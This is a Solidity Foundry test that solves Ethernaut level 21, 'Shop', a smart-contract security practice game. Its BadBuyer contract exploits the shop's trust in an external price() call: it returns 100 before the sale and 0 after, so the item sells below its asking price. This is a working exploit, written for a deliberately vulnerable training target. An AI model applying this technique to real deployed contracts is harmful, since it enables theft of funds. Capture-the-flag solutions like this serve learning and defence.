// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract BadBuyer {
    IShop target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function price() external view returns (uint256) {
        bool sold = target.isSold();

        if (!sold) {
            return 100;
        } else {
            return 0;
        }
    }

    function attack() external {
        target.buy();
    }
}

contract EthernautShopTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x691eeA9286124c043B82997201E805646b76351a; 

    function testLevel21_Shop() public {
        address hacker = makeAddr("hacker");
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance{value: 0.001 ether}(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        console.log("Shop Address:", levelAddr);

        IShop target = IShop(levelAddr);

        BadBuyer buyer = new BadBuyer(levelAddr);
        
        buyer.attack();

        uint256 newPrice = target.price();
        console.log("Harga Baru:", newPrice);
        
        assertLt(newPrice, 100); 

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}